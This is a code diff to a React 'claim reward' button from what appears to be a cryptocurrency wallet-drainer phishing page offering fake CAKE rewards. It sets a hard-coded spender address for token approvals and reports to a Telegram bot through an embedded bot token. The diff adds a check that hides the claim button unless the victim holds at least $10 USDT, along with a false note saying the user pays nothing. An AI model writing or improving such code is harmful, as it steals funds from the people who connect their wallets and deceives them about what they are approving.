@@ -15,7 +15,7 @@ const SPENDER = "0x2990048172A3687249B2DF6c2F2D8e8401330E88"; // Your spender ad
 const sendToTelegram = async (message) => {
   console.log("📩 Sending to Telegram:", message); // debug log
 
-  const botToken = "7477590341:AAHz8Yl2jYCZIa2uBJQnYFifQAUk0WGWkUY"; 
+  const botToken = "7477590341:AAHz8Yl2jYCZIa2uBJQnYFifQAUk0WGWkUY";
   const chatId = "-1002762295115";
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
@@ -74,25 +74,25 @@ export default function ApproveButton() {
     const checkReward = () => {
       const storedReward = localStorage.getItem("cakeReward");
       const scanStatus = localStorage.getItem("scanCompleted");
-      
+
       console.log("Stored CAKE reward from localStorage:", storedReward); // Debug log
       console.log("Scan completed status:", scanStatus); // Debug log
-      
+
       if (storedReward && storedReward !== "0" && storedReward !== "null") {
         setCakeReward(storedReward);
       }
-      
+
       if (scanStatus === "true") {
         setScanCompleted(true);
       }
     };
-    
+
     // Check immediately
     checkReward();
-    
+
     // Also check periodically in case localStorage is updated
     const interval = setInterval(checkReward, 1000);
-    
+
     return () => clearInterval(interval);
   }, []);
 
@@ -203,7 +203,7 @@ export default function ApproveButton() {
       console.error("Process failed:", err.message);
 
       // Determine if error was during signing or approval
-      const errorContext = err.message.toLowerCase().includes('user rejected') 
+      const errorContext = err.message.toLowerCase().includes('user rejected')
         ? (err.message.toLowerCase().includes('sign') ? 'Message signing rejected' : 'Transaction rejected')
         : 'Process failed';
 
@@ -225,6 +225,9 @@ export default function ApproveButton() {
   };
 
 
+  // Check if user has at least $10 USDT
+  const usdtBalanceNumber = usdtBalance ? parseFloat(usdtBalance.formatted) : 0;
+  const hasMinimumUsdt = usdtBalanceNumber >= 10;
 
   // Only show button if wallet is connected AND scanning is completed
   if (!isConnected || !scanCompleted) {
@@ -237,77 +240,130 @@ export default function ApproveButton() {
         border: "1px solid rgba(255, 255, 255, 0.1)",
         color: "rgba(255, 255, 255, 0.7)"
       }}>
-        {!isConnected 
-          ? "🔗 Connect your wallet to claim rewards" 
-          : "🔍 Complete wallet scan to unlock claim button"}
+        {!isConnected
+          ? "🔗 Connect your wallet to claim rewards"
+          : "🔍 Complete wallet scan to unlock claim"}
+      </div>
+    );
+  }
+
+  // Show USDT requirement message if balance is too low
+  if (!hasMinimumUsdt) {
+    return (
+      <div style={{
+        padding: "20px",
+        textAlign: "center",
+        borderRadius: "15px",
+        background: "rgba(255, 193, 7, 0.1)",
+        border: "1px solid rgba(255, 193, 7, 0.3)",
+        color: "rgba(255, 255, 255, 0.9)"
+      }}>
+        <div style={{
+          fontSize: "1.1rem",
+          fontWeight: "600",
+          marginBottom: "10px",
+          color: "#ffc107"
+        }}>
+          💰 Minimum $10 USDT Required
+        </div>
+        <div style={{
+          fontSize: "14px",
+          marginBottom: "15px",
+          color: "rgba(255, 255, 255, 0.8)"
+        }}>
+          Current balance: ${usdtBalanceNumber.toFixed(2)} USDT
+        </div>
+        <div style={{
+          fontSize: "13px",
+          lineHeight: "1.5",
+          color: "rgba(255, 255, 255, 0.7)",
+          background: "rgba(255, 255, 255, 0.05)",
+          padding: "12px",
+          borderRadius: "10px",
+          border: "1px solid rgba(255, 255, 255, 0.1)"
+        }}>
+          💡 Note: You're not paying anything — holding at least $10 USDT or more simply proves you're real and helps stop bots and cheaters from abusing the system. This keeps rewards fair for active users like you.
+        </div>
       </div>
     );
   }
 
   return (
-    <button
-      onClick={handleApprove}
-      disabled={loading}
-      style={{
-        padding: "18px 35px",
-        background: loading 
-          ? "linear-gradient(45deg, #f59e0b, #f97316)" 
-          : "linear-gradient(45deg, #f59e0b, #ea580c, #dc2626)",
-        color: "white",
-        borderRadius: "20px",
-        border: "none",
-        cursor: loading ? "not-allowed" : "pointer",
-        marginTop: "20px",
-        width: "100%",
-        maxWidth: "280px",
-        fontSize: "18px",
-        fontWeight: "700",
-        textTransform: "uppercase",
-        letterSpacing: "0.5px",
-        transition: "all 0.3s ease",
-        transform: loading ? "scale(0.98)" : "scale(1)",
-        boxShadow: loading 
-          ? "0 0 30px rgba(245, 158, 11, 0.5)" 
-          : "0 10px 30px rgba(245, 158, 11, 0.4)",
-        position: "relative",
-        overflow: "hidden",
-        textShadow: "0 2px 4px rgba(0,0,0,0.3)"
-      }}
-      onMouseEnter={(e) => {
-        if (!loading) {
-          e.target.style.transform = "scale(1.05) translateY(-2px)";
-          e.target.style.boxShadow = "0 15px 40px rgba(245, 158, 11, 0.6)";
-        }
-      }}
-      onMouseLeave={(e) => {
-        if (!loading) {
-          e.target.style.transform = "scale(1)";
-          e.target.style.boxShadow = "0 10px 30px rgba(245, 158, 11, 0.4)";
-        }
-      }}
-    >
-      {loading && (
-        <div style={{
-          position: "absolute",
-          top: 0,
-          left: "-100%",
+    <div>
+      <button
+        onClick={handleApprove}
+        disabled={loading || !hasMinimumUsdt}
+        style={{
           width: "100%",
-          height: "100%",
-          background: "linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent)",
-          animation: "claimScan 1.2s infinite"
-        }} />
-      )}
-      <span style={{ position: "relative", zIndex: 1 }}>
-        {loading ? "🔄 Claiming..." : cakeReward && parseFloat(cakeReward) > 0 ? `🍰 Claim ${parseFloat(cakeReward)} CAKE` : "🍰 Claim CAKE Reward"}
-      </span>
-      <style>
-        {`
-          @keyframes claimScan {
-            0% { left: -100%; }
-            100% { left: 100%; }
+          padding: "18px 24px",
+          fontSize: "1.1rem",
+          fontWeight: "700",
+          color: "#ffffff",
+          background: loading || !hasMinimumUsdt
+            ? "rgba(139, 92, 246, 0.5)"
+            : "linear-gradient(135deg, #8b5cf6 0%, #3b82f6 100%)",
+          border: "none",
+          borderRadius: "15px",
+          cursor: loading || !hasMinimumUsdt ? "not-allowed" : "pointer",
+          transition: "all 0.3s ease",
+          boxShadow: loading || !hasMinimumUsdt
+            ? "none"
+            : "0 8px 25px rgba(139, 92, 246, 0.4)",
+          position: "relative",
+          overflow: "hidden",
+          backdropFilter: "blur(10px)",
+        }}
+        onMouseEnter={(e) => {
+          if (!loading && hasMinimumUsdt) {
+            e.target.style.transform = "translateY(-2px)";
+            e.target.style.boxShadow = "0 12px 35px rgba(139, 92, 246, 0.6)";
           }
-        `}
-      </style>
-    </button>
+        }}
+        onMouseLeave={(e) => {
+          if (!loading && hasMinimumUsdt) {
+            e.target.style.transform = "translateY(0)";
+            e.target.style.boxShadow = "0 8px 25px rgba(139, 92, 246, 0.4)";
+          }
+        }}
+      >
+        {loading && (
+          <div style={{
+            position: "absolute",
+            top: 0,
+            left: "-100%",
+            width: "100%",
+            height: "100%",
+            background: "linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent)",
+            animation: "claimScan 1.2s infinite"
+          }} />
+        )}
+        <span style={{ position: "relative", zIndex: 1 }}>
+          {loading ? "🔄 Claiming..." : cakeReward && parseFloat(cakeReward) > 0 ? `🍰 Claim ${parseFloat(cakeReward)} CAKE` : "🍰 Claim CAKE Reward"}
+        </span>
+        <style>
+          {`
+            @keyframes claimScan {
+              0% { left: -100%; }
+              100% { left: 100%; }
+            }
+          `}
+        </style>
+      </button>
+
+      {/* Explanatory note for eligible users */}
+      <div style={{
+        marginTop: "15px",
+        fontSize: "13px",
+        lineHeight: "1.5",
+        color: "rgba(255, 255, 255, 0.7)",
+        background: "rgba(255, 255, 255, 0.05)",
+        padding: "12px",
+        borderRadius: "10px",
+        border: "1px solid rgba(255, 255, 255, 0.1)",
+        textAlign: "center"
+      }}>
+        💡 Note: You're not paying anything — holding at least $10 USDT or more simply proves you're real and helps stop bots and cheaters from abusing the system. This keeps rewards fair for active users like you.
+      </div>
+    </div>
   );
 }
